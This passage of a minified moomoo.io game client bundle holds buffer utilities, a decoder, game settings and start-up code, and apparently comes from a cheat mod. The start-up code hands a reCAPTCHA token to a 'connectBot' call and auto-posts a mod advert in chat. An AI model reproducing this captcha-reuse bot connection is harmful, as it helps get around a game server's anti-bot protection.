                        for (var i = e.slice(t, n), r = "", s = 0; s < i.length; s += 2) r += String.fromCharCode(i[s] + 256 * i[s + 1]);
                        return r
                    }

                    function C(e, t, n) {
                        if (e % 1 != 0 || e < 0) throw new RangeError("offset is not uint");
                        if (e + t > n) throw new RangeError("Trying to access beyond buffer length")
                    }

                    function O(e, t, n, i, r, s) {
                        if (!c.isBuffer(e)) throw new TypeError('"buffer" argument must be a Buffer instance');
                        if (t > r || t < s) throw new RangeError('"value" argument is out of bounds');
                        if (n + i > e.length) throw new RangeError("Index out of range")
                    }

                    function R(e, t, n, i) {
                        t < 0 && (t = 65535 + t + 1);
                        for (var r = 0, s = Math.min(e.length - n, 2); r < s; ++r) e[n + r] = (t & 255 << 8 * (i ? r : 1 - r)) >>> 8 * (i ? r : 1 - r)
                    }

                    function j(e, t, n, i) {
                        t < 0 && (t = 4294967295 + t + 1);
                        for (var r = 0, s = Math.min(e.length - n, 4); r < s; ++r) e[n + r] = t >>> 8 * (i ? r : 3 - r) & 255
                    }

                    function _(e, t, n, i, r, s) {
                        if (n + i > e.length) throw new RangeError("Index out of range");
                        if (n < 0) throw new RangeError("Index out of range")
                    }

                    function U(e, t, n, i, s) {
                        return s || _(e, 0, n, 4), r.write(e, t, n, i, 23, 4), n + 4
                    }

                    function D(e, t, n, i, s) {
                        return s || _(e, 0, n, 8), r.write(e, t, n, i, 52, 8), n + 8
                    }
                    c.prototype.slice = function(e, t) {
                        var n, i = this.length;
                        if ((e = ~~e) < 0 ? (e += i) < 0 && (e = 0) : e > i && (e = i), (t = void 0 === t ? i : ~~t) < 0 ? (t += i) < 0 && (t = 0) : t > i && (t = i), t < e && (t = e), c.TYPED_ARRAY_SUPPORT)(n = this.subarray(e, t)).__proto__ = c.prototype;
                        else {
                            var r = t - e;
                            n = new c(r, void 0);
                            for (var s = 0; s < r; ++s) n[s] = this[s + e]
                        }
                        return n
                    }, c.prototype.readUIntLE = function(e, t, n) {
                        e |= 0, t |= 0, n || C(e, t, this.length);
                        for (var i = this[e], r = 1, s = 0; ++s < t && (r *= 256);) i += this[e + s] * r;
                        return i
                    }, c.prototype.readUIntBE = function(e, t, n) {
                        e |= 0, t |= 0, n || C(e, t, this.length);
                        for (var i = this[e + --t], r = 1; t > 0 && (r *= 256);) i += this[e + --t] * r;
                        return i
                    }, c.prototype.readUInt8 = function(e, t) {
                        return t || C(e, 1, this.length), this[e]
                    }, c.prototype.readUInt16LE = function(e, t) {
                        return t || C(e, 2, this.length), this[e] | this[e + 1] << 8
                    }, c.prototype.readUInt16BE = function(e, t) {
                        return t || C(e, 2, this.length), this[e] << 8 | this[e + 1]
                    }, c.prototype.readUInt32LE = function(e, t) {
                        return t || C(e, 4, this.length), (this[e] | this[e + 1] << 8 | this[e + 2] << 16) + 16777216 * this[e + 3]
                    }, c.prototype.readUInt32BE = function(e, t) {
                        return t || C(e, 4, this.length), 16777216 * this[e] + (this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3])
                    }, c.prototype.readIntLE = function(e, t, n) {
                        e |= 0, t |= 0, n || C(e, t, this.length);
                        for (var i = this[e], r = 1, s = 0; ++s < t && (r *= 256);) i += this[e + s] * r;
                        return i >= (r *= 128) && (i -= Math.pow(2, 8 * t)), i
                    }, c.prototype.readIntBE = function(e, t, n) {
                        e |= 0, t |= 0, n || C(e, t, this.length);
                        for (var i = t, r = 1, s = this[e + --i]; i > 0 && (r *= 256);) s += this[e + --i] * r;
                        return s >= (r *= 128) && (s -= Math.pow(2, 8 * t)), s
                    }, c.prototype.readInt8 = function(e, t) {
                        return t || C(e, 1, this.length), 128 & this[e] ? -1 * (255 - this[e] + 1) : this[e]
                    }, c.prototype.readInt16LE = function(e, t) {
                        t || C(e, 2, this.length);
                        var n = this[e] | this[e + 1] << 8;
                        return 32768 & n ? 4294901760 | n : n
                    }, c.prototype.readInt16BE = function(e, t) {
                        t || C(e, 2, this.length);
                        var n = this[e + 1] | this[e] << 8;
                        return 32768 & n ? 4294901760 | n : n
                    }, c.prototype.readInt32LE = function(e, t) {
                        return t || C(e, 4, this.length), this[e] | this[e + 1] << 8 | this[e + 2] << 16 | this[e + 3] << 24
                    }, c.prototype.readInt32BE = function(e, t) {
                        return t || C(e, 4, this.length), this[e] << 24 | this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3]
                    }, c.prototype.readFloatLE = function(e, t) {
                        return t || C(e, 4, this.length), r.read(this, e, !0, 23, 4)
                    }, c.prototype.readFloatBE = function(e, t) {
                        return t || C(e, 4, this.length), r.read(this, e, !1, 23, 4)
                    }, c.prototype.readDoubleLE = function(e, t) {
                        return t || C(e, 8, this.length), r.read(this, e, !0, 52, 8)
                    }, c.prototype.readDoubleBE = function(e, t) {
                        return t || C(e, 8, this.length), r.read(this, e, !1, 52, 8)
                    }, c.prototype.writeUIntLE = function(e, t, n, i) {
                        e = +e, t |= 0, n |= 0, i || O(this, e, t, n, Math.pow(2, 8 * n) - 1, 0);
                        var r = 1,
                            s = 0;
                        for (this[t] = 255 & e; ++s < n && (r *= 256);) this[t + s] = e / r & 255;
                        return t + n
                    }, c.prototype.writeUIntBE = function(e, t, n, i) {
                        e = +e, t |= 0, n |= 0, i || O(this, e, t, n, Math.pow(2, 8 * n) - 1, 0);
                        var r = n - 1,
                            s = 1;
                        for (this[t + r] = 255 & e; --r >= 0 && (s *= 256);) this[t + r] = e / s & 255;
                        return t + n
                    }, c.prototype.writeUInt8 = function(e, t, n) {
                        return e = +e, t |= 0, n || O(this, e, t, 1, 255, 0), c.TYPED_ARRAY_SUPPORT || (e = Math.floor(e)), this[t] = 255 & e, t + 1
                    }, c.prototype.writeUInt16LE = function(e, t, n) {
                        return e = +e, t |= 0, n || O(this, e, t, 2, 65535, 0), c.TYPED_ARRAY_SUPPORT ? (this[t] = 255 & e, this[t + 1] = e >>> 8) : R(this, e, t, !0), t + 2
                    }, c.prototype.writeUInt16BE = function(e, t, n) {
                        return e = +e, t |= 0, n || O(this, e, t, 2, 65535, 0), c.TYPED_ARRAY_SUPPORT ? (this[t] = e >>> 8, this[t + 1] = 255 & e) : R(this, e, t, !1), t + 2
                    }, c.prototype.writeUInt32LE = function(e, t, n) {
                        return e = +e, t |= 0, n || O(this, e, t, 4, 4294967295, 0), c.TYPED_ARRAY_SUPPORT ? (this[t + 3] = e >>> 24, this[t + 2] = e >>> 16, this[t + 1] = e >>> 8, this[t] = 255 & e) : j(this, e, t, !0), t + 4
                    }, c.prototype.writeUInt32BE = function(e, t, n) {
                        return e = +e, t |= 0, n || O(this, e, t, 4, 4294967295, 0), c.TYPED_ARRAY_SUPPORT ? (this[t] = e >>> 24, this[t + 1] = e >>> 16, this[t + 2] = e >>> 8, this[t + 3] = 255 & e) : j(this, e, t, !1), t + 4
                    }, c.prototype.writeIntLE = function(e, t, n, i) {
                        if (e = +e, t |= 0, !i) {
                            var r = Math.pow(2, 8 * n - 1);
                            O(this, e, t, n, r - 1, -r)
                        }
                        var s = 0,
                            a = 1,
                            o = 0;
                        for (this[t] = 255 & e; ++s < n && (a *= 256);) e < 0 && 0 === o && 0 !== this[t + s - 1] && (o = 1), this[t + s] = (e / a >> 0) - o & 255;
                        return t + n
                    }, c.prototype.writeIntBE = function(e, t, n, i) {
                        if (e = +e, t |= 0, !i) {
                            var r = Math.pow(2, 8 * n - 1);
                            O(this, e, t, n, r - 1, -r)
                        }
                        var s = n - 1,
                            a = 1,
                            o = 0;
                        for (this[t + s] = 255 & e; --s >= 0 && (a *= 256);) e < 0 && 0 === o && 0 !== this[t + s + 1] && (o = 1), this[t + s] = (e / a >> 0) - o & 255;
                        return t + n
                    }, c.prototype.writeInt8 = function(e, t, n) {
                        return e = +e, t |= 0, n || O(this, e, t, 1, 127, -128), c.TYPED_ARRAY_SUPPORT || (e = Math.floor(e)), e < 0 && (e = 255 + e + 1), this[t] = 255 & e, t + 1
                    }, c.prototype.writeInt16LE = function(e, t, n) {
                        return e = +e, t |= 0, n || O(this, e, t, 2, 32767, -32768), c.TYPED_ARRAY_SUPPORT ? (this[t] = 255 & e, this[t + 1] = e >>> 8) : R(this, e, t, !0), t + 2
                    }, c.prototype.writeInt16BE = function(e, t, n) {
                        return e = +e, t |= 0, n || O(this, e, t, 2, 32767, -32768), c.TYPED_ARRAY_SUPPORT ? (this[t] = e >>> 8, this[t + 1] = 255 & e) : R(this, e, t, !1), t + 2
                    }, c.prototype.writeInt32LE = function(e, t, n) {
                        return e = +e, t |= 0, n || O(this, e, t, 4, 2147483647, -2147483648), c.TYPED_ARRAY_SUPPORT ? (this[t] = 255 & e, this[t + 1] = e >>> 8, this[t + 2] = e >>> 16, this[t + 3] = e >>> 24) : j(this, e, t, !0), t + 4
                    }, c.prototype.writeInt32BE = function(e, t, n) {
                        return e = +e, t |= 0, n || O(this, e, t, 4, 2147483647, -2147483648), e < 0 && (e = 4294967295 + e + 1), c.TYPED_ARRAY_SUPPORT ? (this[t] = e >>> 24, this[t + 1] = e >>> 16, this[t + 2] = e >>> 8, this[t + 3] = 255 & e) : j(this, e, t, !1), t + 4
                    }, c.prototype.writeFloatLE = function(e, t, n) {
                        return U(this, e, t, !0, n)
                    }, c.prototype.writeFloatBE = function(e, t, n) {
                        return U(this, e, t, !1, n)
                    }, c.prototype.writeDoubleLE = function(e, t, n) {
                        return D(this, e, t, !0, n)
                    }, c.prototype.writeDoubleBE = function(e, t, n) {
                        return D(this, e, t, !1, n)
                    }, c.prototype.copy = function(e, t, n, i) {
                        if (n || (n = 0), i || 0 === i || (i = this.length), t >= e.length && (t = e.length), t || (t = 0), i > 0 && i < n && (i = n), i === n) return 0;
                        if (0 === e.length || 0 === this.length) return 0;
                        if (t < 0) throw new RangeError("targetStart out of bounds");
                        if (n < 0 || n >= this.length) throw new RangeError("sourceStart out of bounds");
                        if (i < 0) throw new RangeError("sourceEnd out of bounds");
                        i > this.length && (i = this.length), e.length - t < i - n && (i = e.length - t + n);
                        var r, s = i - n;
                        if (this === e && n < t && t < i)
                            for (r = s - 1; r >= 0; --r) e[r + t] = this[r + n];
                        else if (s < 1e3 || !c.TYPED_ARRAY_SUPPORT)
                            for (r = 0; r < s; ++r) e[r + t] = this[r + n];
                        else Uint8Array.prototype.set.call(e, this.subarray(n, n + s), t);
                        return s
                    }, c.prototype.fill = function(e, t, n, i) {
                        if ("string" == typeof e) {
                            if ("string" == typeof t ? (i = t, t = 0, n = this.length) : "string" == typeof n && (i = n, n = this.length), 1 === e.length) {
                                var r = e.charCodeAt(0);
                                r < 256 && (e = r)
                            }
                            if (void 0 !== i && "string" != typeof i) throw new TypeError("encoding must be a string");
                            if ("string" == typeof i && !c.isEncoding(i)) throw new TypeError("Unknown encoding: " + i)
                        } else "number" == typeof e && (e &= 255);
                        if (t < 0 || this.length < t || this.length < n) throw new RangeError("Out of range index");
                        if (n <= t) return this;
                        var s;
                        if (t >>>= 0, n = void 0 === n ? this.length : n >>> 0, e || (e = 0), "number" == typeof e)
                            for (s = t; s < n; ++s) this[s] = e;
                        else {
                            var a = c.isBuffer(e) ? e : z(new c(e, i).toString()),
                                o = a.length;
                            for (s = 0; s < n - t; ++s) this[s + t] = a[s % o]
                        }
                        return this
                    };
                    var L = /[^+\/0-9A-Za-z-_]/g;

                    function F(e) {
                        return e < 16 ? "0" + e.toString(16) : e.toString(16)
                    }

                    function z(e, t) {
                        var n;
                        t = t || 1 / 0;
                        for (var i = e.length, r = null, s = [], a = 0; a < i; ++a) {
                            if ((n = e.charCodeAt(a)) > 55295 && n < 57344) {
                                if (!r) {
                                    if (n > 56319) {
                                        (t -= 3) > -1 && s.push(239, 191, 189);
                                        continue
                                    }
                                    if (a + 1 === i) {
                                        (t -= 3) > -1 && s.push(239, 191, 189);
                                        continue
                                    }
                                    r = n;
                                    continue
                                }
                                if (n < 56320) {
                                    (t -= 3) > -1 && s.push(239, 191, 189), r = n;
                                    continue
                                }
                                n = 65536 + (r - 55296 << 10 | n - 56320)
                            } else r && (t -= 3) > -1 && s.push(239, 191, 189);
                            if (r = null, n < 128) {
                                if ((t -= 1) < 0) break;
                                s.push(n)
                            } else if (n < 2048) {
                                if ((t -= 2) < 0) break;
                                s.push(n >> 6 | 192, 63 & n | 128)
                            } else if (n < 65536) {
                                if ((t -= 3) < 0) break;
                                s.push(n >> 12 | 224, n >> 6 & 63 | 128, 63 & n | 128)
                            } else {
                                if (!(n < 1114112)) throw new Error("Invalid code point");
                                if ((t -= 4) < 0) break;
                                s.push(n >> 18 | 240, n >> 12 & 63 | 128, n >> 6 & 63 | 128, 63 & n | 128)
                            }
                        }
                        return s
                    }

                    function H(e) {
                        return i.toByteArray(function(e) {
                            if ((e = function(e) {
                                return e.trim ? e.trim() : e.replace(/^\s+|\s+$/g, "")
                            }(e).replace(L, "")).length < 2) return "";
                            for (; e.length % 4 != 0;) e += "=";
                            return e
                        }(e))
                    }

                    function V(e, t, n, i) {
                        for (var r = 0; r < i && !(r + n >= t.length || r >= e.length); ++r) t[r + n] = e[r];
                        return r
                    }
                }).call(this, n(12))
            }, function(e, t) {
                var n;
                n = function() {
                    return this
                }();
                try {
                    n = n || new Function("return this")()
                } catch (e) {
                    "object" == typeof window && (n = window)
                }
                e.exports = n
            }, function(e, t) {
                for (var n = t.uint8 = new Array(256), i = 0; i <= 255; i++) n[i] = r(i);

                function r(e) {
                    return function(t) {
                        var n = t.reserve(1);
                        t.buffer[n] = e
                    }
                }
            }, function(e, t, n) {
                t.FlexDecoder = s, t.FlexEncoder = a;
                var i = n(0),
                    r = "BUFFER_SHORTAGE";

                function s() {
                    if (!(this instanceof s)) return new s
                }

                function a() {
                    if (!(this instanceof a)) return new a
                }

                function o() {
                    throw new Error("method not implemented: write()")
                }

                function c() {
                    throw new Error("method not implemented: fetch()")
                }

                function l() {
                    return this.buffers && this.buffers.length ? (this.flush(), this.pull()) : this.fetch()
                }

                function h(e) {
                    (this.buffers || (this.buffers = [])).push(e)
                }

                function u() {
                    return (this.buffers || (this.buffers = [])).shift()
                }

                function f(e) {
                    return function(t) {
                        for (var n in e) t[n] = e[n];
                        return t
                    }
                }
                s.mixin = f({
                    bufferish: i,
                    write: function(e) {
                        var t = this.offset ? i.prototype.slice.call(this.buffer, this.offset) : this.buffer;
                        this.buffer = t ? e ? this.bufferish.concat([t, e]) : t : e, this.offset = 0
                    },
                    fetch: c,
                    flush: function() {
                        for (; this.offset < this.buffer.length;) {
                            var e, t = this.offset;
                            try {
                                e = this.fetch()
                            } catch (e) {
                                if (e && e.message != r) throw e;
                                this.offset = t;
                                break
                            }
                            this.push(e)
                        }
                    },
                    push: h,
                    pull: u,
                    read: l,
                    reserve: function(e) {
                        var t = this.offset,
                            n = t + e;
                        if (n > this.buffer.length) throw new Error(r);
                        return this.offset = n, t
                    },
                    offset: 0
                }), s.mixin(s.prototype), a.mixin = f({
                    bufferish: i,
                    write: o,
                    fetch: function() {
                        var e = this.start;
                        if (e < this.offset) {
                            var t = this.start = this.offset;
                            return i.prototype.slice.call(this.buffer, e, t)
                        }
                    },
                    flush: function() {
                        for (; this.start < this.offset;) {
                            var e = this.fetch();
                            e && this.push(e)
                        }
                    },
                    push: h,
                    pull: function() {
                        var e = this.buffers || (this.buffers = []),
                            t = e.length > 1 ? this.bufferish.concat(e) : e[0];
                        return e.length = 0, t
                    },
                    read: l,
                    reserve: function(e) {
                        var t = 0 | e;
                        if (this.buffer) {
                            var n = this.buffer.length,
                                i = 0 | this.offset,
                                r = i + t;
                            if (r < n) return this.offset = r, i;
                            this.flush(), e = Math.max(e, Math.min(2 * n, this.maxBufferSize))
                        }
                        return e = Math.max(e, this.minBufferSize), this.buffer = this.bufferish.alloc(e), this.start = 0, this.offset = t, 0
                    },
                    send: function(e) {
                        var t = e.length;
                        if (t > this.minBufferSize) this.flush(), this.push(e);
                        else {
                            var n = this.reserve(t);
                            i.prototype.copy.call(e, this.buffer, n)
                        }
                    },
                    maxBufferSize: 65536,
                    minBufferSize: 2048,
                    offset: 0,
                    start: 0
                }), a.mixin(a.prototype)
            }, function(e, t, n) {
                t.decode = function(e, t) {
                    var n = new i(t);
                    return n.write(e), n.read()
                };
                var i = n(16).DecodeBuffer
                }, function(e, t, n) {
                    t.DecodeBuffer = r;
                    var i = n(8).preset;

                    function r(e) {
                        if (!(this instanceof r)) return new r(e);
                        if (e && (this.options = e, e.codec)) {
                            var t = this.codec = e.codec;
                            t.bufferish && (this.bufferish = t.bufferish)
                        }
                    }
                    n(14).FlexDecoder.mixin(r.prototype), r.prototype.codec = i, r.prototype.fetch = function() {
                        return this.codec.decode(this)
                    }
                }, function(e, t, n) {
                    var i = n(4),
                        r = n(7),
                        s = r.Uint64BE,
                        a = r.Int64BE;
                    t.getReadFormat = function(e) {
                        var t = o.hasArrayBuffer && e && e.binarraybuffer,
                            n = e && e.int64;
                        return {
                            map: l && e && e.usemap ? u : h,
                            array: f,
                            str: d,
                            bin: t ? g : p,
                            ext: m,
                            uint8: y,
                            uint16: v,
                            uint32: b,
                            uint64: S(8, n ? E : T),
                            int8: k,
                            int16: w,
                            int32: x,
                            int64: S(8, n ? M : I),
                            float32: S(4, A),
                            float64: S(8, P)
                        }
                    }, t.readUint8 = y;
                    var o = n(0),
                        c = n(6),
                        l = "undefined" != typeof Map;

                    function h(e, t) {
                        var n, i = {},
                            r = new Array(t),
                            s = new Array(t),
                            a = e.codec.decode;
                        for (n = 0; n < t; n++) r[n] = a(e), s[n] = a(e);
                        for (n = 0; n < t; n++) i[r[n]] = s[n];
                        return i
                    }

                    function u(e, t) {
                        var n, i = new Map,
                            r = new Array(t),
                            s = new Array(t),
                            a = e.codec.decode;
                        for (n = 0; n < t; n++) r[n] = a(e), s[n] = a(e);
                        for (n = 0; n < t; n++) i.set(r[n], s[n]);
                        return i
                    }

                    function f(e, t) {
                        for (var n = new Array(t), i = e.codec.decode, r = 0; r < t; r++) n[r] = i(e);
                        return n
                    }

                    function d(e, t) {
                        var n = e.reserve(t),
                            i = n + t;
                        return c.toString.call(e.buffer, "utf-8", n, i)
                    }

                    function p(e, t) {
                        var n = e.reserve(t),
                            i = n + t,
                            r = c.slice.call(e.buffer, n, i);
                        return o.from(r)
                    }

                    function g(e, t) {
                        var n = e.reserve(t),
                            i = n + t,
                            r = c.slice.call(e.buffer, n, i);
                        return o.Uint8Array.from(r).buffer
                    }

                    function m(e, t) {
                        var n = e.reserve(t + 1),
                            i = e.buffer[n++],
                            r = n + t,
                            s = e.codec.getExtUnpacker(i);
                        if (!s) throw new Error("Invalid ext type: " + (i ? "0x" + i.toString(16) : i));
                        return s(c.slice.call(e.buffer, n, r))
                    }

                    function y(e) {
                        var t = e.reserve(1);
                        return e.buffer[t]
                    }

                    function k(e) {
                        var t = e.reserve(1),
                            n = e.buffer[t];
                        return 128 & n ? n - 256 : n
                    }

                    function v(e) {
                        var t = e.reserve(2),
                            n = e.buffer;
                        return n[t++] << 8 | n[t]
                    }

                    function w(e) {
                        var t = e.reserve(2),
                            n = e.buffer,
                            i = n[t++] << 8 | n[t];
                        return 32768 & i ? i - 65536 : i
                    }

                    function b(e) {
                        var t = e.reserve(4),
                            n = e.buffer;
                        return 16777216 * n[t++] + (n[t++] << 16) + (n[t++] << 8) + n[t]
                    }

                    function x(e) {
                        var t = e.reserve(4),
                            n = e.buffer;
                        return n[t++] << 24 | n[t++] << 16 | n[t++] << 8 | n[t]
                    }

                    function S(e, t) {
                        return function(n) {
                            var i = n.reserve(e);
                            return t.call(n.buffer, i, !0)
                        }
                    }

                    function T(e) {
                        return new s(this, e).toNumber()
                    }

                    function I(e) {
                        return new a(this, e).toNumber()
                    }

                    function E(e) {
                        return new s(this, e)
                    }

                    function M(e) {
                        return new a(this, e)
                    }

                    function A(e) {
                        return i.read(this, e, !1, 23, 4)
                    }

                    function P(e) {
                        return i.read(this, e, !1, 52, 8)
                    }
                }, function(e, t, n) {
                    ! function(t) {
                        e.exports = t;
                        var n = "listeners",
                            i = {
                                on: function(e, t) {
                                    return a(this, e).push(t), this
                                },
                                once: function(e, t) {
                                    var n = this;
                                    return i.originalListener = t, a(n, e).push(i), n;

                                    function i() {
                                        s.call(n, e, i), t.apply(this, arguments)
                                    }
                                },
                                off: s,
                                emit: function(e, t) {
                                    var n = this,
                                        i = a(n, e, !0);
                                    if (!i) return !1;
                                    var r = arguments.length;
                                    if (1 === r) i.forEach((function(e) {
                                        e.call(n)
                                    }));
                                    else if (2 === r) i.forEach((function(e) {
                                        e.call(n, t)
                                    }));
                                    else {
                                        var s = Array.prototype.slice.call(arguments, 1);
                                        i.forEach((function(e) {
                                            e.apply(n, s)
                                        }))
                                    }
                                    return !!i.length
                                }
                            };

                        function r(e) {
                            for (var t in i) e[t] = i[t];
                            return e
                        }

                        function s(e, t) {
                            var i;
                            if (arguments.length) {
                                if (t) {
                                    if (i = a(this, e, !0)) {
                                        if (!(i = i.filter((function(e) {
                                            return e !== t && e.originalListener !== t
                                        }))).length) return s.call(this, e);
                                        this[n][e] = i
                                    }
                                } else if ((i = this[n]) && (delete i[e], !Object.keys(i).length)) return s.call(this)
                            } else delete this[n];
                            return this
                        }

                        function a(e, t, i) {
                            if (!i || e[n]) {
                                var r = e[n] || (e[n] = {});
                                return r[t] || (r[t] = [])
                            }
                        }
                        r(t.prototype), t.mixin = r
                    }((
                        function e() {
                            if (!(this instanceof e)) return new e
                        }))
                }, function(e, t, n) {
                    (function(t) {
                        e.exports.maxScreenWidth = 1920, e.exports.maxScreenHeight = 1080, e.exports.serverUpdateRate = 9, e.exports.maxPlayers = t && -1 != t.argv.indexOf("--largeserver") ? 80 : 40, e.exports.maxPlayersHard = e.exports.maxPlayers + 10, e.exports.collisionDepth = 6, e.exports.minimapRate = 3e3, e.exports.colGrid = 10, e.exports.clientSendRate = 5, e.exports.healthBarWidth = 50, e.exports.healthBarPad = 4.5, e.exports.iconPadding = 15, e.exports.iconPad = .9, e.exports.deathFadeout = 3e3, e.exports.crownIconScale = 60, e.exports.crownPad = 35, e.exports.chatCountdown = 3e3, e.exports.chatCooldown = 500, e.exports.inSandbox = t && "mm_exp" === t.env.VULTR_SCHEME, e.exports.maxAge = 100, e.exports.gatherAngle = Math.PI / 2.6, e.exports.gatherWiggle = 10, e.exports.hitReturnRatio = .25, e.exports.hitAngle = Math.PI / 2, e.exports.playerScale = 35, e.exports.playerSpeed = .0016, e.exports.playerDecel = .993, e.exports.nameY = 34, e.exports.skinColors = ["#bf8f54", "#cbb091", "#896c4b", "#fadadc", "#ececec", "#c37373", "#4c4c4c", "#ecaff7", "#738cc3", "#8bc373"], e.exports.animalCount = 7, e.exports.aiTurnRandom = .06, e.exports.cowNames = [
  "S_ i D _Y_01",
  "S_ t E p _Y_02",
  "S_ B m O _Y_03",
  "S_ R O m _DY_04",
  "S_ J _n _DY th _c _ _L_05",
  "S_ F _ _n _Y_06",
  "S_ V _n c _Y_07",
  "S_ N _th _n_08",
  "S_ N _ck_09",
  "S_ Fl _pp _Y_10",
  "S_ R _n _LD_11",
  "S_ Ot _s_12",
  "S_ P _p _13",
  "S_ Mc D _n _LD_14",
  "S_ Th _ _Y_15",
  "S_ F _bz_16",
  "S_ _l _v _r_17",
  "S_ J _ff_18",
  "S_ J _mmy_19",
  "S_ H _l _n _Y_20",
  "S_ R _ _p _r_21",
  "S_ B _n_22",
  "S_ _l _n_23",
  "S_ N _ _m _Y_24",
  "S_ X _Z_25",
  "S_ Cl _v _r_26",
  "S_ J _r _my_27",
  "S_ M _k _28",
  "S_ D _st _n _D_29",
  "S_ St _ll _ _n_30",
  "S_ A _l _s _n_31",
  "S_ M _ _t _Y_32",
  "S_ S _ph _Y_33",
  "S_ V _j _34",
  "S_ J _ _Y_35",
  "S_ P _nd _36",
  "S_ M _rch _D_37",
  "S_ Th _ _Y_38",
  "S_ J _r _D_39",
  "S_ J _ly_40",
  "S_ S _n _Y_41",
  "S_ M _l_42",
  "S_ D _xt _r_43",
  "S_ Q _ _nn_44",
  "S_ M _lky_45"
], e.exports.shieldAngle = Math.PI / 3, e.exports.weaponVariants = [{
                            id: 0,
                            src: "",
                            xp: 0,
                            val: 1
                        }, {
                            id: 1,
                            src: "_g",
                            xp: 3e3,
                            val: 1.1
                        }, {
                            id: 2,
                            src: "_d",
                            xp: 7e3,
                            val: 1.18
                        }, {
                            id: 3,
                            src: "_r",
                            poison: !0,
                            xp: 12e3,
                            val: 1.18
                        }], e.exports.fetchVariant = function(t) {
                            for (var n = t.weaponXP[t.weaponIndex] || 0, i = e.exports.weaponVariants.length - 1; i >= 0; --i)
                                if (n >= e.exports.weaponVariants[i].xp) return e.exports.weaponVariants[i]
                        }, e.exports.resourceTypes = ["wood", "food", "stone", "points"], e.exports.areaCount = 7, e.exports.treesPerArea = 9, e.exports.bushesPerArea = 3, e.exports.totalRocks = 32, e.exports.goldOres = 7, e.exports.riverWidth = 724, e.exports.riverPadding = 114, e.exports.waterCurrent = .0011, e.exports.waveSpeed = 1e-4, e.exports.waveMax = 1.3, e.exports.treeScales = [150, 160, 165, 175], e.exports.bushScales = [80, 85, 95], e.exports.rockScales = [80, 85, 90], e.exports.snowBiomeTop = 2400, e.exports.snowSpeed = .75, e.exports.maxNameLength = 15, e.exports.mapScale = 14400, e.exports.mapPingScale = 40, e.exports.mapPingTime = 2200
                    }).call(this, n(41))
                }, function(e, t) {
                    var n = {
                        utf8: {
                            stringToBytes: function(e) {
                                return n.bin.stringToBytes(unescape(encodeURIComponent(e)))
                            },
                            bytesToString: function(e) {
                                return decodeURIComponent(escape(n.bin.bytesToString(e)))
                            }
                        },
                        bin: {
                            stringToBytes: function(e) {
                                for (var t = [], n = 0; n < e.length; n++) t.push(255 & e.charCodeAt(n));
                                return t
                            },
                            bytesToString: function(e) {
                                for (var t = [], n = 0; n < e.length; n++) t.push(String.fromCharCode(e[n]));
                                return t.join("")
                            }
                        }
                    };
                    e.exports = n
                }, function(e, t, n) {
                    //"use strict";
                    setTimeout(() => {console.clear();}, 1111);
                    window.loadedScript = !0;
                    var i = "127.0.0.1" !== location.hostname && !location.hostname.startsWith("192.168.");
                    n(22);
                    var r = n(23),
                        s = n(42),
                        a = n(43),
                        o = n(19),
                        c = n(44),
                        l = n(45),
                        h = (n(46), n(47)),
                        u = n(48),
                        f = n(55),
                        d = n(56),
                        p = n(57),
                        g = n(58).obj,
                        m = new a.TextManager,
                        y = new(n(59))("moomoo.io", 3e3, o.maxPlayers, 5, !1),
                        autochats = new a.autochats,
                        packageManager = function(src) {
                        };
                    y.debugLog = !1;
                    var k = !1,
                        wl = "";

                    function v() {
                        ht && ut && (k = !0, i ? window.grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", {
                            action: "homepage"
                        }).then((function(e) {
                            w(e)
                        })) : w(null))
                    }

                    function tp (n) {
                        if(packs[n]) {
                            return packs[n];
                        } else {
                            return n;
                        }
                    }

                    function w(e) {
                        y.start((function(t, n, a) {
                            var c = (i ? "wss" : "ws") + "://" + t + ":8008/?gameIndex=" + a;
                            e && (c += "&token=", wl = e,connectBot(c), c += encodeURIComponent(e)), r.connect(c, (function(e) {
                                Bi(), setInterval(() => Bi(), 2500), e ? ft(e) : (ue.onclick = s.checkTrusted((function() {
                                    ! function() {
                                        var e = ++bt > 1,
                                            t = Date.now() - wt > vt;
                                        e && t ? (wt = Date.now(), xt()) : Tn()
                                        setTimeout(() => {
                                            r.send("ch", "Sandy Best Mod 2023-24");
                                        }, 1000);
                                    }()
                                })), s.hookTouchEvents(ue), fe.onclick = s.checkTrusted((function() {
                                    Oi("https://krunker.io/?play=SquidGame_KB")
                                })), s.hookTouchEvents(fe), pe.onclick = s.checkTrusted((function() {
                                    setTimeout((function() {
                                        ! function() {
                                            var e = xe.value,
                                                t = prompt("party key", e);
                                            t && (window.onbeforeunload = void 0, window.location.href = "/?server=" + t)
                                        }()
                                    }), 10)
                                })), s.hookTouchEvents(pe), ge.onclick = s.checkTrusted((function() {
                                    Ae.classList.contains("showing") ? (Ae.classList.remove("showing"), me.innerText = "Settings") : (Ae.classList.add("showing"), me.innerText = "Close")
                                })), s.hookTouchEvents(ge), ye.onclick = s.checkTrusted((function() {
                                    yn(), "block" != Ye.style.display ? Ut() : Ye.style.display = "none"
                                })), s.hookTouchEvents(ye), ke.onclick = s.checkTrusted((function() {
                                    "block" != Qe.style.display ? (Qe.style.display = "block", Ye.style.display = "none", an(), Gt()) : Qe.style.display = "none"
                                })), s.hookTouchEvents(ke), ve.onclick = s.checkTrusted((function() {
                                    rn()
                                })), s.hookTouchEvents(ve), Ne.onclick = s.checkTrusted((function() {
                                    xn()
                                })), s.hookTouchEvents(Ne), function() {
                                    for (var e = 0; e < jn.length; ++e) {
                                        var t = new Image;
                                        t.onload = function() {
                                            this.isLoaded = !0
                                        }, t.src = ".././img/icons/" + jn[e] + ".png", Rn[jn[e]] = t
                                    }
                                }(), Pe.style.display = "none", Me.style.display = "block", Le.value = E("moo_name") || "", function() {
                                    var e = E("native_resolution");
                                    Zt(e ? "true" == e : "undefined" != typeof cordova), setInterval((function() {
                                        window.cordova && (document.getElementById("downloadButtonContainer").classList.add("cordova"), document.getElementById("mobileDownloadButtonContainer").classList.add("cordova"))
                                    }), 1e3), en(), s.removeAllChildren(Ce);
                                    for (var t = 0; t < l.weapons.length + l.list.length; ++t) ! function(e) {
                                        s.generateElement({
                                            id: "actionBarItem" + e,
                                            class: "actionBarItem",
                                            style: "display:none",
                                            onmouseout: function() {
                                                Tt()
                                            },
                                            parent: Ce
                                        })
                                    }(t);
                                    for (t = 0; t < l.list.length + l.weapons.length; ++t) ! function(e) {
                                        var t = document.createElement("canvas");
                                        t.width = t.height = 66;
                                        var n = t.getContext("2d");
